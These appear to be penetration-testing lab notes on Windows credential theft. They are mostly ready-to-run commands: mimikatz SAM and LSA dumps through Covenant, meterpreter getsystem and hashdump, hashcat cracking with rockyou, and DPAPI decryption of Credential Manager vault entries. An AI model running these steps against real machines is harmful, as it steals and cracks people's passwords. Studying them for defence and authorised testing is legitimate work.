# workstation dominance

## dumping hashes with covenant and mimikatz

On a high-integrity grunt:

```
mimikatz token::elevate lsadump::secrets
```

```
mimikatz token::elevate lsadump::sam
```

Covenant stores the hashes in the "Data" section.

## dumping hashes with metasploit

View current user privileges:

```
meterpreter > run post/windows/gather/win_privs
```

GetSystem

```
meterpreter > getsystem
```

Use hashdump

```
meterpreter > hashdump
```

If you see a `089c0` at the end of the hashes, they are most likely DISABLED

```
meterpreter > load kiwi
```

view Mimikatz help

```
meterpreter > help
```

Various stuff you can do...

```
meterpreter > creds_all
```

```
meterpreter > lsa_dump_sam
```

```
meterpreter > lsa_dump_secrets
```

## cracking hashes with `hashcat`

view hash-modes on website...

https://hashcat.net/hashcat/

https://github.com/NotSoSecure/password_cracking_rules

On Windows:

```
hashcat.exe -a 0 -m 1000 <hash> -r OneRuleToRuleThemAll.rule rockyou.txt
```

## cracking credential vault with covenant

On a medium integrity grunt:

```
mimikatz vault::cred
```

```
ls C:\Users\s.chisholm.mayorsec\AppData\Local\Microsoft\Credentials
```

Smallest size - the one we wanna use. Take note of that hash.

grunt > task > mimikatz

command:

```
"dpapi::cred /in:C:\Users\s.chisholm.mayorsec\AppData\Local\Microsoft\Credentials\<hash>"
```

Take note of guidMasterKey.

```
ls C:\users\s.chisholm.mayorsec\AppData\Roaming\Microsoft\Protect
```

Look for SID value. Take note of the value.

```
ls C:\users\s.chisholm.mayorsec\AppData\Roaming\Microsoft\Protect\<SID-value>
```

look for the entry with the same GUID value. Copy the whole directory

```
"dpapi::masterkey /in:C:\users\s.chisholm.mayorsec\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /rpc"
```

Get the key... save to notepad.

Go back to task...

```
"dpapi::cred /in:C:\Users\s.chisholm.mayorsec\AppData\Local\Microsoft\Credentials\<hash> /masterkey <key>"
```

## cracking credential vault with metasploit

in meterpreter session:

```
meterpreter > upload /opt/Tools/mimikatz_trunk/x64/mimikatz.exe C:\\Users\\Public\\mimikatz.exe
```

```
meterpreter > shell
```

Confirm that mimikatz.exe is uploaded

```
cd C:\Users\Public
```

```
> dir
```

```
> dir /a C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials
```

```
> mimikatz.exe
```

```
mimikatz # vault::cred
```

Again, hash is the smaller sized file.

```
mimikatz # dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\<hash>
```

```
mimikatz # exit
```

Go to Protect directory:

```
dir /a C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect
```

```
dir /a C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\<SID>
```

Get the GUID

```
mimikatz.exe
```

```
mimikatz # dpapi::masterkey /in:C:\Users\s.chisholm.mayorsec\appdata\roaming\microsoft\protect\<SID>\<GUID> /rpc
```

Get the key!

Last but not least:

```
mimikatz # dpapi::cred /in:C:\Users\s.chisholm.mayorsec\appdata\local\microsoft\credentials\<hash> /masterkey <key>
```









